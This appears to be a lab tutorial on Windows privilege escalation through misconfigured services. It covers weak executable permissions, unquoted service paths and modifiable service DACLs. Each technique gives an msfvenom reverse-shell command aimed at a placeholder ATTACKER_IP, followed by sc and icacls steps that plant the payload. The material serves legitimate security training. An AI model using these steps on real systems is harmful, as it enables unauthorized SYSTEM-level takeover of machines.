# Windows Privilege Escalation: Abusing Service Misconfigurations

## Windows Services

Windows services are managed by the **Service Control Manager (SCM)**, which handles the state of services, checks their status, and provides configuration options. Each service has an associated executable and specifies the user account under which it runs.

### Service Configuration Example

Using the `sc qc` command, we can inspect a service's configuration:

```cmd
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
    TYPE               : 20  WIN32_SHARE_PROCESS
    START_TYPE         : 2   AUTO_START
    ERROR_CONTROL      : 1   NORMAL
    BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
    LOAD_ORDER_GROUP   :
    TAG                : 0
    DISPLAY_NAME       : Application Host Helper Service
    DEPENDENCIES       :
    SERVICE_START_NAME : localSystem
```

Key parameters:
- **BINARY_PATH_NAME**: Path to the service executable.
- **SERVICE_START_NAME**: Account used to run the service.

Services have a **Discretionary Access Control List (DACL)** that defines permissions for starting, stopping, querying, or reconfiguring the service. Service configurations are stored in the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`.

---

## Exploitation Techniques

### 1. Insecure Permissions on Service Executable

If the service executable has weak permissions, attackers can replace it with a malicious payload.

#### Example: Splinterware System Scheduler

```cmd
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
    TYPE               : 10  WIN32_OWN_PROCESS
    START_TYPE         : 2   AUTO_START
    ERROR_CONTROL      : 0   IGNORE
    BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
    SERVICE_START_NAME : .\svcuser1
```

The executable has **modify permissions** for the `Everyone` group:

```cmd
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
```

Steps to exploit:
1. Generate a payload:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
   ```
2. Replace the service executable:
   ```cmd
   C:\> move WService.exe WService.exe.bkp
   C:\> move rev-svc.exe WService.exe
   C:\> icacls WService.exe /grant Everyone:F
   ```
3. Restart the service:
   ```cmd
   C:\> sc stop windowsscheduler
   C:\> sc start windowsscheduler
   ```

---

### 2. Unquoted Service Paths

Unquoted paths with spaces can allow attackers to hijack the service by placing malicious executables in priority locations.

#### Example: Disk Sorter Enterprise

```cmd
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
    BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

If `C:\MyPrograms` is writable, attackers can create `C:\MyPrograms\Disk.exe` to hijack the service.

Steps to exploit:
1. Generate a payload:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
   ```
2. Place the payload:
   ```cmd
   C:\> move rev-svc2.exe C:\MyPrograms\Disk.exe
   C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
   ```
3. Restart the service:
   ```cmd
   C:\> sc stop "disk sorter enterprise"
   C:\> sc start "disk sorter enterprise"
   ```

---

### 3. Insecure Service Permissions

If the service DACL allows modification, attackers can reconfigure the service to execute a malicious payload.

#### Example: THMService

Check the service DACL using `AccessChk`:

```cmd
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
    SERVICE_ALL_ACCESS
```

Steps to exploit:
1. Generate a payload:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
   ```
2. Transfer the payload and grant permissions:
   ```cmd
   C:\> icacls rev-svc3.exe /grant Everyone:F
   ```
3. Reconfigure the service:
   ```cmd
   C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
   ```
4. Restart the service:
   ```cmd
   C:\> sc stop THMService
   C:\> sc start THMService
   ```